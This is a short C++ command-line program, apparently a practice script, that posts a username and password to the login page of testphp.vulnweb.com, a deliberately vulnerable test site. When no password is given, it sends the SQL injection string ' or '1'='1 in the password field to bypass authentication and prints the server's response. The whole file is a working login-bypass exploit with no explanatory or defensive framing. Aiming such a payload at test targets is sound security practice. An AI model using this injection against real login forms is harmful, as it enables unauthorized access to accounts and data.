#include <iostream>
#include <string>
#include <cpr/cpr.h>

const std::string urlAddress = "http://testphp.vulnweb.com/userinfo.php";
const std::string nameKey = "uname";
const std::string passKey = "pass";
const std::string injectionString = "' or '1'='1";

cpr::Response Login(std::string name, std::string password) {
    cpr::Url url{urlAddress};
    cpr::Payload payload{{nameKey, std::move(name)}, {passKey, std::move(password)}};
    return cpr::Post(std::move(url), std::move(payload));
}

cpr::Response LoginWithoutPassword(std::string name) {
	return Login(std::move(name), injectionString);
}

void printResponse(cpr::Response response) {
    if (response.status_code == cpr::status::HTTP_OK) {
   	std::cout << response.text << std::endl;
    }
    else {
	std::cout << "Something went wrong! Received status " << response.status_code << std::endl;
    }
}

void printInstruction() {
	std::cout << "testphp_login only accepts one or two arguments." << std::endl;
	std::cout << "You must specify a USERNAME and optionally a PASSWORD with the following syntax:" << std::endl;
	std::cout <<  "testphp_login USERNAME PASSWORD" << std::endl;
	std::cout <<  "testphp_login USERNAME" << std::endl;
}

int main(int argc, char** argv) {
    cpr::Response response;

    // Username and password were provided.
    if (argc == 3) {
	response = Login(argv[1], argv[2]);
	printResponse(std::move(response));
    }
    // Only username was provided.
    else if (argc == 2) {
	response = LoginWithoutPassword(argv[1]);
	printResponse(std::move(response));
    }
    // Invalid input, teach the user how to use this app.
    else {
	printInstruction();
    }

    return 0;
}
